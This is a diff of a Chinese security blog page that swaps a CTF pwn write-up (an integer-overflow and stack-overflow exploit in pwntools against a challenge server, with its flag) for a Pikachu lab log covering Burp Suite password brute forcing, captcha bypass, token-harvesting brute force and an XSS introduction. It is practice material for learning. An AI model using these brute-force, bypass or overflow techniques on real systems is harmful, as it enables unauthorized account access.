@@ -3,26 +3,25 @@
 <head>
   <meta charset="utf-8">
   
-  <title>攻防世界 int_overflow | Sinky-wang</title>
+  <title>pikachu漏洞练习记录1 | Sinky-wang</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="checksec 查看保护机制 可直接使用栈溢出；基地址不变化；栈中数据有执行权限； 分析思路32位文件，按流程查看程序，main()无突破点。 进入login(),限制username长度最大0x19;限制passwd长度最大0x199； 进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;&#x3D;8可跳到else语句。  此处有突破点：v3类型为unsign">
+  <meta name="description" content="0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin&#x2F;123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界 int_overflow">
-<meta property="og:url" content="https://sinky-wang.github.io/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/index.html">
+<meta property="og:title" content="pikachu漏洞练习记录1">
+<meta property="og:url" content="https://sinky-wang.github.io/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/index.html">
 <meta property="og:site_name" content="Sinky-wang">
-<meta property="og:description" content="checksec 查看保护机制 可直接使用栈溢出；基地址不变化；栈中数据有执行权限； 分析思路32位文件，按流程查看程序，main()无突破点。 进入login(),限制username长度最大0x19;限制passwd长度最大0x199； 进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;&#x3D;8可跳到else语句。  此处有突破点：v3类型为unsign">
+<meta property="og:description" content="0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin&#x2F;123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png">
-<meta property="article:published_time" content="2020-10-16T04:29:57.489Z">
-<meta property="article:modified_time" content="2020-09-10T07:29:14.007Z">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png">
+<meta property="article:published_time" content="2020-10-30T08:02:38.085Z">
+<meta property="article:modified_time" content="2020-11-02T10:33:48.641Z">
 <meta property="article:author" content="Sinky-wang">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png">
   
     <link rel="alternative" href="/atom.xml" title="Sinky-wang" type="application/atom+xml">
   
@@ -301,11 +300,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-攻防世界pwn-int_overflow" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pikachu漏洞练习1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.489Z" itemprop="datePublished">2020-10-16</time>
+      <a href="/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" class="article-date">
+      <time datetime="2020-10-30T08:02:38.085Z" itemprop="datePublished">2020-10-30</time>
 </a>
     </div>
   
@@ -318,7 +317,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      攻防世界 int_overflow
+      pikachu漏洞练习记录1
     </h1>
   
 
@@ -329,7 +328,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -339,31 +338,42 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="checksec-查看保护机制"><a href="#checksec-查看保护机制" class="headerlink" title="checksec 查看保护机制"></a>checksec 查看保护机制</h3><p><img src="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png" alt="捕获.PNG"></p>
-<p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p>
-<h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p>
-<p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p>
-<p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p>
-<blockquote>
-<p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p>
+        <h1 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01 暴力破解"></a>0x01 暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>开启bp抓包，对username,password字段的字典做爆破，得到admin/123456.</p>
+<h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。</p>
+<p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p>
+<h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p>
+<p>查看源码，输入的验证码在本地验证：</p>
+<p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" alt="捕获.PNG"></p>
+<p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p>
+<h2 id="token放爆破？"><a href="#token放爆破？" class="headerlink" title="token放爆破？"></a>token放爆破？</h2><blockquote>
+<p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p>
 </blockquote>
-<p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p>
-<p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p>
-<p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p>
-<p>在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.</p>
-<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。</p>
-<p>在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：</p>
-<p><img src="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png" alt="17627983-255df211907024ca.png"></p>
-<p><img src="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png" alt="17627983-73596713043662d6.png"></p>
-<p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。</strong>随机选取数值262.<br>（what_is_this()函数的地址为4字节）</p>
-<p>262-0x14-4-4=234</p>
-<p>或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。</p>
-<p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p>
-<p>exp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh&#x3D;remote(&#39;111.198.29.45&#39;,39118)</span><br><span class="line">sh.recvuntil(&#39;Your choice:&#39;)</span><br><span class="line">flag&#x3D;0x0804868B</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;username:&#39;)</span><br><span class="line">sh.sendline(&#39;z&#39;)</span><br><span class="line">sh.recvuntil(&#39;passwd:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x14+&#39;aaaa&#39;+p32(flag)+&#39;a&#39;*234</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>
-
+<h3 id="基于token的身份验证"><a href="#基于token的身份验证" class="headerlink" title="基于token的身份验证"></a>基于token的身份验证</h3><ul>
+<li>客户端使用用户名和密码请求登录</li>
+<li>服务端收到请求去验证用户名和密码</li>
+<li>验证成功后，服务端会签发一个token，再将token发送给客户端</li>
+<li>客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。</li>
+<li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li>
+<li>服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。</li>
+<li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li>
+</ul>
+<p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p>
+<p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" alt="捕获.PNG"></p>
+<p>在测试器中，设置password和token两个变量，使用pitchfork。</p>
+<p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p>
+<p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p>
+<p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" alt="捕获.PNG"></p>
+<p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p>
+<p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" alt="捕获.PNG"></p>
+<p>开始攻击，根据不同length找出正确密码，爆破完成。</p>
+<p>注：该方法着实鸡肋。</p>
+<h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<p>因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p>
+<ul>
+<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。</li>
+<li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li>
+</ul>
+<h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2>
       
       
         <div class="page-reward">
@@ -418,13 +428,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/">攻防世界 int_overflow</a></p>
+        <p><span>本文标题:</span><a href="/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/">pikachu漏洞练习记录1</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Sinky-wang 的个人博客">Sinky-wang</a></p>
-        <p><span>发布时间:</span>2020年10月16日 - 12时29分</p>
-        <p><span>最后更新:</span>2020年09月10日 - 15时29分</p>
+        <p><span>发布时间:</span>2020年10月30日 - 16时02分</p>
+        <p><span>最后更新:</span>2020年11月02日 - 18时33分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" title="攻防世界 int_overflow">https://sinky-wang.github.io/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://sinky-wang.github.io/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/　　作者: Sinky-wang" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" title="pikachu漏洞练习记录1">https://sinky-wang.github.io/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://sinky-wang.github.io/2020/10/30/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/　　作者: Sinky-wang" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -437,18 +447,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/11/02/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          攻防世界 string
+          burp四种密码爆破模式学习
         
       </div>
     </a>
   
   
-    <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">攻防世界 guess_num</div>
+    <a href="/2020/10/16/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">各类型软件漏洞合集</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -459,7 +469,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-查看保护机制"><span class="toc-number">1.</span> <span class="toc-text">checksec 查看保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析思路"><span class="toc-number">2.</span> <span class="toc-text">分析思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击思路"><span class="toc-number">3.</span> <span class="toc-text">攻击思路</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-暴力破解"><span class="toc-number">1.</span> <span class="toc-text">0x01 暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于表单的暴力破解"><span class="toc-number">1.1.</span> <span class="toc-text">基于表单的暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#验证码绕过-on-server"><span class="toc-number">1.2.</span> <span class="toc-text">验证码绕过(on server)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#验证码绕过-on-client"><span class="toc-number">1.3.</span> <span class="toc-text">验证码绕过(on client)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#token放爆破？"><span class="toc-number">1.4.</span> <span class="toc-text">token放爆破？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于token的身份验证"><span class="toc-number">1.4.1.</span> <span class="toc-text">基于token的身份验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-XSS-跨站脚本"><span class="toc-number">2.</span> <span class="toc-text">0x02 XSS(跨站脚本)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反射性xss-get"><span class="toc-number">2.1.</span> <span class="toc-text">反射性xss(get)</span></a></li></ol></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -528,13 +538,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" title="上一篇: 攻防世界 string">
+            <a href="/2020/11/02/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/" title="上一篇: burp四种密码爆破模式学习">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/" title="下一篇: 攻防世界 guess_num">
+            <a href="/2020/10/16/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="下一篇: 各类型软件漏洞合集">
                 <i class="fa fa-angle-right"></i>
             </a>
         
